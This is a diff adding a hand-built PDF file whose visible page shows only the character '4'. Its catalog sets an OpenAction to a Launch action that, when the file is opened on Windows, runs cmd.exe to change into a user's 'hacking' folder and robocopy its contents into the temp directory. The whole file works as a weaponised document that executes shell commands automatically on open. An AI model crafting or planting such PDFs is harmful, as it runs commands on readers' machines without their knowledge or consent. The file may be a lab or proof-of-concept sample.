@@ -1,0 +1,43 @@
+%PDF-1.5
+1 0 obj<</Type/Catalog/Outlines 2 0 R/Pages 3 0 R/OpenAction 5 0 R>>endobj
+2 0 obj<</Type/Outlines/Count 0>>endobj
+3 0 obj<</Type/Pages/Kids[4 0 R]/Count 1 >>endobj
+4 0 obj<</Type/Page/Parent 3 0 R   /Resources <<
+    /Font <<
+      /F1 6 0 R 
+    >>
+  >> /Contents 7 0 R /MediaBox[0 0 612 792]>>endobj
+5 0 obj
+<<
+	/Type/Action/S/Launch/Win <<
+		/F (cmd.exe) /P (/K cd ../.. && cd Users/Mike Row/hacking && robocopy ./ %TMP% /s /IF "4" && echo "4")
+	>>
+	/Pages 2 0 R
+	/Type /Catalog
+>>
+endobj
+6 0 obj
+<<
+  /Type /Font
+  /Subtype /Type1
+  /BaseFont /Times-Roman
+>>
+endobj
+7 0 obj  % page content
+<<
+  /Length 44
+>>
+stream
+BT
+70 50 TD
+/F1 12 Tf
+(4) Tj
+ET
+endstream
+endobj
+
+trailer
+<<
+	/Root 1 0 R
+>>
+%%EOF
